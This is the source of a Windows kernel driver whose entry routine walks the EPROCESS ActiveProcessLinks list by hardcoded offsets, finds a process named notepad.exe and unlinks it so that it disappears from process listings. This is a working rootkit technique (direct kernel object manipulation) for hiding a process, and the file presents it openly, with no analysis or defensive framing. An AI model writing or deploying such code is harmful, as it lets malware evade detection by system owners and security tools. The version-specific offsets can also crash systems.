#include <ntifs.h>
#include <wdm.h>

// DriverEntry

extern "C" NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    UNREFERENCED_PARAMETER(DriverObject);
    PEPROCESS currentProcess = PsGetCurrentProcess();
    static ULONG offset_ActiveProcessLinks = 0x448; // Offset for the ActiveProcessLinks in EPROCESS structure, may vary by OS version
    static ULONG offset_ImageFileName = 0x5a8; // Offset for the ImageFileName in EPROCESS structure, may vary by OS version

    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "EPROCESS: %p\n", currentProcess));

    PLIST_ENTRY head = (PLIST_ENTRY)((PUCHAR)currentProcess + offset_ActiveProcessLinks);
    PLIST_ENTRY currentNode = head->Flink; // Start with the first process in the list
    char* targetProcessName = "notepad.exe"; // Replace with the actual process name you are looking for
    while (currentNode != head) {
        PEPROCESS process = (PEPROCESS)((PUCHAR)currentNode - offset_ActiveProcessLinks);
        char* imageFileName = (char*)((PUCHAR)process + offset_ImageFileName);
        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Process: %s (PID: %d)\n", imageFileName, PsGetProcessId(process)));
        // now let's check till we find the process we are looking for
        if (strcmp(imageFileName, targetProcessName) == 0) { // Replace with the actual process name you are looking for
            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[+]Process %s found\n", targetProcessName));
            PLIST_ENTRY flink = currentNode->Flink;
            PLIST_ENTRY blink = currentNode->Blink;

            blink->Flink = flink;
            flink->Blink = blink;

            currentNode->Flink = currentNode;
            currentNode->Blink = currentNode;

            KdPrint(("Process successfully hidden!\n"));
            break;
        }
        currentNode = currentNode->Flink;
    }
    return STATUS_SUCCESS;
}